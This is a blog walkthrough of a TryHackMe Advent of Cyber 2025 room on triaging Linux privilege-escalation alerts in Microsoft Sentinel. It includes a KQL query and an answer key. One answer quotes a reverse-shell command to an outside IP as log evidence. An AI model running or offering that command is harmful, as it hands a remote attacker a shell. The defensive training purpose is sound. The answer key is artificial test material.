---
title: "TryHackMe: Advent Of Cyber 2025 Day 10 (SOC Alert Triaging - Tinsel Triage)"
categories: [TryHackMe]
tags: [dfir, log analysis, KQL, advent of cyber]
render_with_liquid: false
media_subpath: /images/tryhackme_aoc2025_day10/
image:
  path: banner.png
---

Investigate and triage alerts through Microsoft Sentinel.

<h2 style="color:#A64AC9; text-align:center; font-weight:700; font-size:1.8em; text-shadow: 1px 0 #A64AC9, -1px 0 #A64AC9, 0 1px #A64AC9, 0 -1px #A64AC9;">
  The Story
</h2>

[![TryHackMe Room Link](header.svg){: width="1200" height="407" }](https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2)

## Introduction

The Best Festival Company's Security Operations Center was in chaos. Screens flickered, lights flashed, and the sound of alerts echoed through the room like a digital thunderstorm. The elves rushed between consoles, their faces lit by the glow of red and orange warnings. It was raining alerts, and no one knew where the storm had begun.

Whispers spread through the SOC as tension filled the air. Something strange was happening across the cloud environment, and the timing couldn't be worse. As the blizzard of alerts grew heavier, one name surfaced among the worried elves: the evil Easter Bunnies. But why now? And what were they after this time?

## It's Raining Alerts

McSkidy was notified that it's raining alerts; something unusual is happening within the Azure tenant. The dashboards are lighting up with suspicious activities, and early signs indicate a possible attack from the Evil Bunnies. The Best Festival Company must act fast to survive this onslaught before it affects the entire season's operations. 

Before investigating these alerts in Microsoft Sentinel, McSkidy must step back and understand what's happening. When alerts start flooding in, jumping straight into each one isn't efficient since not all alerts are equal. Some are noise, others are false positives, and a few may indicate real threats in progress.

This is where alert triaging becomes critical. Triaging helps security teams identify which alerts deserve immediate attention, which can be deprioritised, and which can be safely ignored for a moment. The process separates chaos from clarity, allowing analysts like McSkidy's SOC team to focus their time and resources where it truly matters.

![](alert.png){: width="1920" height="1080"}

## Alert Triaging

Now, let's continue the discussion about alert triaging. In the previous section, we introduced triaging and why it is essential. This time, we'll focus on how to approach it, what to prioritise, what to look for, and what to do right after an alert. 

When multiple alerts appear, analysts should have a consistent method to assess and prioritise them quickly. There are many factors you can consider when triaging, but these are the fundamental ones that should always be part of your process of identifying and evaluating alerts:

| **Key Factors**           | **Description**                                                                                      | **Why It Matters?**                                                                                          |
|---------------------------|------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| **Severity Level**        | Review the alert's severity rating, ranging from Informational to Critical.                          | Indicates the urgency of response and potential business risk.                                               |
| **Timestamp and Frequency** | Identify when the alert was triggered and check for related activity before and after that time.     | Helps identify ongoing attacks or patterns of repeated behaviour.                                            |
| **Attack Stage**          | Determine which stage of the attack lifecycle the alert represents (reconnaissance, persistence, exfiltration). | Reveals how far the attacker may have progressed and what their objective might be.                         |
| **Affected Asset**        | Identify the system, user, or resource involved and assess its importance to operations.              | Helps prioritise response based on asset criticality and potential impact.                                  |

In short, these four represent the essential dimensions of triage:

- **Severity:** How bad?
- **Time:** When?
- **Context:** Where in the attack lifecycle?
- **Impact:** Who or what is affected?

They form a balanced foundation that's simple enough for analysts to apply quickly but comprehensive enough for informed decisions.

After reviewing these factors, decide on your next step: escalate to the incident response team, perform a deeper investigation, or close the alert if it's confirmed to be a false positive. A structured triage process like this helps ensure that time and resources are focused on what truly matters.

## Diving Deeper into an Alert

After identifying which alerts deserve further attention, it's time to dig into the details. Follow these steps to investigate and correlate effectively:

- **Investigate the alert in detail.** 
Open the alert and review the entities, event data, and detection logic. Confirm whether the activity represents real malicious behaviour.

- **Check the related logs.** 
Examine the relevant log sources. Look for patterns or unusual actions that align with the alert.

- **Correlate multiple alerts.** 
Identify other alerts involving the same user, IP address, or device. Correlation often reveals a broader attack sequence or coordinated activity.

- **Build context and a timeline.** 
Combine timestamps, user actions, and affected assets to reconstruct the sequence of events. This helps determine if the attack is ongoing or has already been contained.

- **Decide on the following action.** 
If there are indicators of compromise, escalate to the incident response team. Investigate further if more evidence or correlation is needed. Close or suppress if the alert is a confirmed false positive, and update detection rules accordingly.

- **Document findings and lessons learned.** 
Keep a clear record of the analysis, decisions, and remediation steps. Proper documentation strengthens SOC processes and supports continuous improvement.

With the triage complete and the investigation in motion, McSkidy begins piecing together the puzzle. Every alert, log entry, and timestamp brings her closer to uncovering what the Evil Bunnies are up to inside the Azure tenant. It's time to connect the dots and reveal the bigger picture behind the noise.

## Environment Review

Before proceeding with alert triaging, let’s first review the lab environment.

To get started, head over to the Azure Portal and search for Microsoft Sentinel.

![](sentinel1.png){: width="2514" height="516"}

Then, click the Sentinel instance, go to the **Logs** tab and select the custom log table named **Syslog_CL**.

![](sentinel2.png){: width="2894" height="1118"}

After running the query, the logs for this lab environment should be rendered.

![](sentinel3.png){: width="2876" height="1368"}

Now that we have reviewed the environment, let's proceed with the discussion of alert triaging in the next task.

## McSkidy Goes Triaging

Now that we have learned about triaging, let's move to the fun part, working inside the actual SOC environment of the Best Festival Company hosted in Azure. This is where McSkidy will put her triage skills to the test using Microsoft Sentinel, a cloud-native SIEM and SOAR platform. Sentinel collects data from various Azure services, applications, and connected sources to detect, investigate, and respond to threats in real time.

Through Sentinel, McSkidy can view and manage alerts, analyse incidents, and correlate activities across multiple logs. It provides visibility into what's happening within the Azure tenant and efficiently allows analysts to pivot from one alert to another. In this next part, we'll explore how McSkidy reviews alerts, drills into the evidence, and uses Sentinel's investigation tools to uncover the truth behind the Evil Bunnies' attack.

## Microsoft Sentinel in Action

To start the activity, navigate to [Microsoft Sentinel](https://portal.azure.com/#browse/microsoft.securityinsightsarg%2Fsentinel) and select your dedicated Sentinel instance. Then, under the **Threat management** dropdown, select the **Incidents** tab to view the incidents triggered during the current timeframe. You may also press the `<<` button to expand the view as shown in the image below.

![](sentinel4.png){: width="2892" height="1408"}

**Note:** In case the alerts do not appear, refresh your browser page (see image below)

![](sentinel5.png){: width="2920" height="1400"}

From the task images, there are eight open incidents, four of high severity and four of medium severity. Note that these numbers might differ in your lab environment.

Since we focus on addressing the most critical threats first, we’ll begin with the high-severity alerts. These represent potential compromise points or privilege-escalation activities that could lead to complete host control if left unchecked.

To begin the triage, we’ll examine one high-severity incident in detail: the **Linux PrivEsc—Kernel Module Insertion** alert. By clicking the alert, additional details appear on the right-hand side.

![](sentinel6.png){: width="2434" height="1176"}

Upon checking the alert, as seen in the above image, the following details can be initially inferred:

1. There are three events related to the alert.
2. The alert was recently created (this may vary depending on your lab instance).
3. There are three entities involved in the alert.
4. The alert is classified as a Privilege Escalation tactic.

We can get further details from here by clicking the **View full details** button.

![](details.png){: width="774" height="158"}

In the new view, we can see that in addition to the details shown in the summary, we can also view the possible **Incident Timeline** and **Similar Incidents**.

![](sentinel7.png){: width="2588" height="1208"}

## Understanding Related Alerts

From the view above, you may notice that several alerts point to the same affected entities. This helps us understand the relationship and the possible sequence of events that impact the same host or user.

When multiple alerts are linked to a single entity, such as the same **machine**, **user**, or **IP address**, it typically indicates that these detections are not isolated incidents, but somewhat different stages of the same intrusion.

By analysing which alerts share the same entities, we can start to trace the attack path, from the initial access to privilege escalation and persistence.

For example, if the same VM triggered the following alerts:

| **Alert**                         | **What does it suggest?**                                           |
|----------------------------------|-----------------------------------------------------------------------|
| Root SSH Login from External IP  | The attacker gained remote access (via SSH) to the system (Initial Access) |
| SUID Discovery                   | The attacker looked for ways to escalate privileges.                 |
| Kernel Module Insertion          | The attacker installed a malicious kernel module for persistence.    |

At this stage, McSkidy has reviewed the high-severity alerts, identified the affected entities, and noticed that several detections are linked together. This initial triage allows her to prioritise which incidents need immediate attention and recognise when multiple alerts are actually part of a larger compromise.

With this foundational understanding, McSkidy is ready to move beyond surface-level triage and dive deeper into the underlying logs, which will be discussed in the next task.

## In-Depth Log Analysis with Sentinel

With the initial triage complete, McSkidy now examines the raw evidence behind these alerts. The next task involves diving into the underlying log data within Microsoft Sentinel to validate the alerts and uncover the exact attacker actions that triggered them. By analysing authentication attempts, command executions, and system changes, McSkidy can begin piecing together the full story of how the attack unfolded.

If we go back to the alert's full details view, we can try clicking the Events from the Evidence section.

![](log1.png){: width="2916" height="1324"}

From this view, we can definitely see the actual name of the kernel module installed in each machine and the time it was installed.

Diving deeper into this, we can try checking the raw events from a single host through a custom query. To do this, let's change the view into an editable KQL query and find all the events triggered from **app-02**.

1. Press the **Simple mode** dropdown from the upper-right corner and select KQL mode.
2. Modify the query with the following KQL query below.

```console
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-02'
| project _timestamp_t, host_s, Message
```

3. Press the **Run** button and wait for the results.

![](log2.png){: width="1906" height="536"}

After executing the query, it can be seen that multiple potentially suspicious events occurred around the installation of the kernel module.

1. Execution of the **cp** (copy) command to create a shadow file backup.
2. Addition of the user account Alice to the sudoers group.
3. Modification of the backupuser account by root.
4. Insertion of the malicious_mod.ko module.
5. Successful SSH authentication by the root user.

![](log3.png){: width="1960" height="1376"}

Based on the surrounding events, including the execution of the **cp** command to create a shadow file backup, the addition of the user account Alice to the sudoers group, the modification of the backupuser account by root, and the successful SSH authentication by the root user, this activity appears highly unusual. The sequence suggests potential privilege escalation and persistence behaviour, indicating that the event may not be part of normal system operations and warrants further investigation.

Now that we have discussed the methodology for determining and reviewing alerts, let’s help McSkidy complete the assessment by examining the remaining alerts and answering the questions below.

![](incident.png){: width="1920" height="1080"}

## Answer

### Question 1

How many entities are affected by the **Linux PrivEsc - Polkit Exploit Attempt** alert?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('10')" style="cursor:pointer;">10</span>
    <i onclick="navigator.clipboard.writeText('10')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 2

What is the severity of the **Linux PrivEsc – Sudo Shadow Access** alert?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('High')" style="cursor:pointer;">High</span>
    <i onclick="navigator.clipboard.writeText('High')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 3

How many accounts were added to the sudoers group in the Linux PrivEsc – User **Added to Sudo Group** alert?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('4')" style="cursor:pointer;">4</span>
    <i onclick="navigator.clipboard.writeText('4')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 4

What is the name of the kernel module installed in websrv-01?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('malicious_mod.ko')" style="cursor:pointer;">malicious_mod.ko</span>
    <i onclick="navigator.clipboard.writeText('malicious_mod.ko')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 5

What is the unusual command executed within websrv-01 by the ops user?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1')" style="cursor:pointer;">/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1</span>
    <i onclick="navigator.clipboard.writeText('/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 6

What is the source IP address of the first successful SSH login to storage-01?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('172.16.0.12')" style="cursor:pointer;">172.16.0.12</span>
    <i onclick="navigator.clipboard.writeText('172.16.0.12')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 7

What is the external source IP that successfully logged in as root to app-01?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('203.0.113.45')" style="cursor:pointer;">203.0.113.45</span>
    <i onclick="navigator.clipboard.writeText('203.0.113.45')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 8

Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('deploy')" style="cursor:pointer;">deploy</span>
    <i onclick="navigator.clipboard.writeText('deploy')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>